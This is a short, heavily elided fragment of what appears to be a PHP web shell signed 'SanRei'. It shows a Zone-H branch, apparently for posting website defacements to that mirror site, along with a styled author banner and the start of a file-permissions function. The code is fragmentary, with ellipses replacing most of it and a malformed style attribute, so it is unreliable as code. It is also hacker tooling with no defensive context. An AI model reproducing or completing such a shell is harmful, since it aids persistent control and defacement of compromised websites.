...
if($_GET['to'] == 'zoneh') {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>By SanRei</textarea><br>
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">" SanRei</center>
</body>
</html>';
function perms($file){
